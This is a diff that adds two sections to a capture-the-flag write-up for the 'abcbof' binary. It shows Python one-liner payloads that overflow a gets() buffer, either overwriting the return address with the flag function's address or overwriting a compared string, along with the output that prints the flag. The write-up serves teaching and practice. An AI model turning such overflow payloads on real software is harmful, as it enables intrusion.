@@ -132,7 +132,39 @@ There are two methods we can use to exploit this call and print the flag.
 
 ### Overwriting the return address
 
+We know from Radare2 that ```gets()``` will write our input to ```rbp-0x110```.
+Therefore, writing 0x110+8 (280) bytes will overwrite ```rbp``` and another 8 bytes would over write the return address.
+If we overwrite the return address with the address of the flag function, the program should print the flag.
+
+```
+python -c "import sys; sys.stdout.buffer.write(b'\x41' * 280 + b'\x27\x07\x40\x00\x00\x00\x00\x00')" | ./abcbof
+```
+
+Here's the output:
+
+```
+[greenavocado@greenavocado-pc abcbof]$ python -c "import sys; sys.stdout.buffer.write(b'\x41' * 280 + b'\x27\x07\x40\x00\x00\x00\x00\x00')" | ./abcbof
+Hello everyone, say your name: You lose!
+castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
+```
+
 ### Overwriting ```rbp-0x10```
+
+Instead of overwriting the return address, because the string being compared is located on under the address used by ```gets()```, we can also overwrite this variable with the correct string.
+
+The start of the string being compared is located 0x100 (256) bytes after the address used by ```gets()```.
+Therefore, if we fill the first variable by writing 256 arbitrary bytes, we can write into the address of the second variable.
+
+```
+python -c "print('A' * 256 + 'CyberCastors')" | ./abcbof
+```
+
+Here's the output:
+
+```
+[greenavocado@greenavocado-pc abcbof]$ python -c "print('A' * 256 + 'CyberCastors')" | ./abcbof
+Hello everyone, say your name: castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
+```
 
 ## Flag
 
